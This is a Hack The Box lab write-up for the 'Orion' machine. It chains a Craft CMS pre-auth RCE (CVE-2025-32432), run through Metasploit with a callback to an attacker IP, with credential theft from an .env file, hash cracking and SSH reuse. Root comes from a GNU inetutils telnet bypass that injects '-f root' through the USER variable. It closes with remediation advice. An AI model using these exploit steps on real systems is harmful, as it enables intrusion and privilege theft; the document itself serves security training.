---
title: "Orion — Craft CMS Pre-Auth RCE and Loopback Telnet Authentication Bypass to Root"
description: "Craft CMS pre-authentication RCE (CVE-2025-32432) and plaintext database credentials lead to an administrator hash and SSH access; a GNU inetutils telnet authentication bypass (CVE-2026-24061) on loopback yields root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - cms
  - credential-access
  - privilege-escalation
objective: "Escalate from a pre-authentication CMS exploit to root through credential recovery and a legacy local-service authentication bypass."
tools:
  - rustscan
  - feroxbuster
  - metasploit
  - mysql
  - hashcat
  - sshpass
  - telnet
skill: "Pre-authentication web exploitation and local privilege escalation through credential recovery"
outcome: "Root via a loopback GNU inetutils telnet authentication bypass after recovering credentials from a pre-auth CMS exploit"
---

## At a glance

| Field | Value |
|---|---|
| Target environment | Linux host running nginx and SSH; Craft CMS 5.6.16 |
| Starting position | Unauthenticated network access |
| Objective | Escalate from a pre-authentication CMS exploit to root through credential recovery and a legacy local-service authentication bypass |
| Outcome | Root via a loopback GNU inetutils telnet authentication bypass |

## From pre-auth CMS RCE to telnet bypass

Orion is a Hack The Box Linux lab that exposes SSH and an nginx-hosted Craft CMS 5.6.16 application. A pre-authentication remote code execution flaw in Craft CMS yields a `www-data` shell; the application environment file then discloses plaintext MySQL credentials, and the user table returns an administrator bcrypt hash. The hash cracks offline to a password reused for SSH, and an authentication bypass in the loopback telnet service (GNU inetutils 2.7, CVE-2026-24061) reaches root. This writeup replaces target identifiers, credentials, and secret values with role-based placeholders and preserves command syntax. See [how evidence is handled](/method/).

**Attack path:** **Unauthenticated web enumeration → Craft CMS 5.6.16 pre-auth RCE (CVE-2025-32432) → `www-data` shell → plaintext database credentials in the environment file → MySQL administrator hash → offline crack → SSH as a named user → loopback GNU inetutils telnet authentication bypass (CVE-2026-24061) → root**

## nginx Craft CMS host from unauthenticated access

- **Target:** a Linux host exposing an nginx web tier and SSH.
- **Exposed services:** SSH (22) and HTTP (80).
- **Local setup:** the application hostname was mapped to the target in the operator's hosts file so the site resolved consistently.
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** move from an unauthenticated public service to user and root control, and demonstrate the impact of weak secret handling and a legacy local service.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: pre-auth RCE to loopback telnet root

### 1. Service Enumeration

Observation: a fast TCP scan enumerates open ports and service versions.

```bash
mkdir nmap ; rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/Orion-TCP
```

Truncated scan output:

```text
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Significance: SSH requires credentials, so the nginx web tier is the only unauthenticated attack surface.

Result: two services are exposed, and the web tier is the entry point.

### 2. Web Application Discovery

Observation: the web service redirected to a hostname, a step reconstructed from the source notes because no output was captured. Directory enumeration then exposed an admin login page.

```bash
feroxbuster --url http://<TARGET_HOSTNAME> --wordlist <WEB_CONTENT_WORDLIST>
```

Discovery result and the login page fingerprint:

```text
http://<TARGET_HOSTNAME>/admin/login
Craft CMS 5.6.16
CVE-2025-32432
```

Significance: the admin login endpoint and the exact CMS version identify a known pre-authentication remote code execution vulnerability.

Result: an unauthenticated admin login page discloses a vulnerable CMS version.

### 3. Pre-Authentication Remote Code Execution

Observation: Craft CMS 5.6.16 is affected by CVE-2025-32432, and a public Metasploit module delivers the exploit.

```bash
msfconsole
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
set rhosts <TARGET_HOSTNAME>
set rport 80
set lhost <ATTACKER_IP>
exploit
```

The exploit returned a shell as the web-service account, which was upgraded to a full TTY:

```bash
script /dev/null -c /bin/bash
```

```text
www-data@<TARGET_HOSTNAME>:~$
```

Significance: the exploit achieves code execution without authentication in the context of the web service account.

Result: a `www-data` shell on the application host.

### 4. Credential Discovery in the Application Environment File

Observation: the Craft CMS environment file is readable and stores database credentials in plaintext.

```bash
cat /var/www/html/.env
```

Truncated file contents:

```text
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=<DB_PASSWORD>
```

Significance: the application stores active database credentials in a readable plaintext file, so any file-read capability on the host yields them.

Result: plaintext MySQL credentials are recovered from the application host.

### 5. MySQL Administrator Hash Retrieval

Observation: the database listens on loopback and the recovered credentials access it.

```bash
mysql -u root -p'<DB_PASSWORD>'
show databases;
```

Truncated database list:

```text
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| <APPLICATION_DATABASE> |
| performance_schema |
| sys                |
+--------------------+
```

Querying the user store returns the administrator record and its password hash:

```sql
use <APPLICATION_DATABASE>;
select id, email, password from users\G
```

```text
id: 1
email: <SSH_USER>@<TARGET_HOSTNAME>
password: <BCRYPT_HASH>
```

Significance: the user table stores bcrypt password hashes, and the administrator record is directly exposed.

Result: an administrator account and its bcrypt hash are recovered.

### 6. Hash Cracking and SSH Pivot

Observation: the bcrypt hash is crackable offline.

```bash
hashcat -m 3200 <HASH_FILE> <WORDLIST_PATH> -D2
```

```text
:<CRACKED_PASSWORD>
```

The recovered cleartext authenticates over SSH as the same named user:

```bash
sshpass -p '<CRACKED_PASSWORD>' ssh <SSH_USER>@<TARGET_HOSTNAME>
```

```text
<SSH_USER>@<TARGET_HOSTNAME>:~$
```

Significance: the credential reused across the application and the operating-system account turns a cracked hash into a usable system login.

Result: authenticated SSH access as a named host user.

### 7. Privilege Escalation via Loopback Telnet Authentication Bypass

Observation: a telnet service listens only on loopback, and I checked the installed client to identify the affected version.

```bash
netstat -tulnp
```

```text
tcp        0      0 127.0.0.1:23            0.0.0.0:*               LISTEN      -
```

```bash
telnet --version
```

```text
telnet (GNU inetutils) 2.7
```

GNU inetutils 2.7 is affected by CVE-2026-24061, an argument-injection flaw in which telnetd passes the `USER` environment variable to `login(1)` without sanitization. Setting `USER="-f root"` and requesting login (`-a`) bypasses authentication:

```bash
export USER="-f root"
telnet -a 127.0.0.1
```

```text
root@<TARGET_HOSTNAME>:~#
```

Significance: a service reachable only from the local host converts a low-privileged local shell into root, so a loopback binding does not remove the risk.

Result: a root shell is obtained through the telnet authentication bypass.

## Challenges and Decisions

The source records no failed attempts or remediation obstacles for this machine; access moved cleanly from unauthenticated web exploitation to a pre-auth shell, credential recovery, SSH access, and the local bypass. It also documents no tradeoffs or fixes, so none appear here.

## Outcome: root via loopback telnet authentication bypass

A reused credential recovered from the pre-authentication CMS exploit provided SSH access to a named user, and the loopback telnet authentication bypass carried that session to root. The bypass required an existing local shell, because the telnet service listened only on loopback.

## Recommendations: unpatched CMS, plaintext secrets, reuse, and legacy telnet

The case establishes each exposure, while the proposed fixes remain unvalidated.

1. **Unpatched public-facing CMS.** Craft CMS 5.6.16 is affected by a pre-authentication RCE, so the web tier is compromised before any authentication occurs. *Recommendation:* upgrade to a fixed release (5.6.17 or later; 4.14.15 and 3.9.15 for older branches) and track Craft CMS security advisories. *Detection:* monitor for anomalous requests to admin and application endpoints consistent with the exploit path.
2. **Plaintext secrets in the application environment file.** The environment file stored active MySQL credentials in readable plaintext, so any file-read path on the host exposes the database. *Recommendation:* move secrets into a managed secret store, restrict file permissions, and use least-privilege database accounts that the web user cannot read.
3. **Password reuse across application and system tiers.** The administrator hash cracked to a cleartext password that also authenticated SSH, so one recovery bridged the application and operating-system boundaries. *Recommendation:* enforce unique credentials per account and prefer key-based SSH authentication with multi-factor access.
4. **Legacy loopback telnet service.** The local telnet service running GNU inetutils 2.7 exposed CVE-2026-24061, an authentication bypass that grants root from a local shell. *Recommendation:* remove unnecessary legacy services, upgrade or replace inetutils with a patched version, and restrict the telnet port even on loopback. *Detection:* alert when unexpected inbound telnet connections occur or processes invoke `login(1)` with an attacker-controlled `USER` value.

## References

- [Hack The Box — Orion](https://app.hackthebox.com/machines/Orion) (retired machine)
- [NVD — CVE-2025-32432](https://nvd.nist.gov/vuln/detail/CVE-2025-32432) (Craft CMS pre-authentication remote code execution)
- [Craft CMS security advisory — GHSA-f3gw-9ww9-jmc3](https://github.com/craftcms/cms/security/advisories/GHSA-f3gw-9ww9-jmc3) (vendor advisory and patched versions)
- [Craft CMS — CVE-2025-32432 guidance](https://craftcms.com/knowledge-base/craft-cms-cve-2025-32432) (vendor knowledge-base guidance)
- [NVD — CVE-2026-24061](https://nvd.nist.gov/vuln/detail/CVE-2026-24061) (GNU inetutils telnetd authentication bypass)
- [GNU InetUtils security advisory — telnetd authentication bypass](https://lists.gnu.org/archive/html/bug-inetutils/2026-01/msg00004.html) (vendor advisory)
- [GNU Inetutils manual — telnet invocation](https://www.gnu.org/software/inetutils/manual/html_node/telnet-invocation.html) (authoritative telnet client documentation)
- [RustScan](https://github.com/RustScan/RustScan) (fast port scanning)
- [feroxbuster](https://github.com/epi052/feroxbuster) (content discovery)
- [Metasploit module — Craft CMS pre-auth RCE (CVE-2025-32432)](https://www.rapid7.com/db/modules/exploit/linux/http/craftcms_preauth_rce_cve_2025_32432/)
- [Hashcat](https://hashcat.net/hashcat/) (offline password recovery, including bcrypt mode 3200)
- [MySQL Reference Manual — `mysql` command-line client](https://docs.oracle.com/cd/E17952_01/mysql-8.0-en/mysql.html) (authoritative client documentation)
- [sshpass](https://sourceforge.net/projects/sshpass/) (non-interactive SSH password authentication)
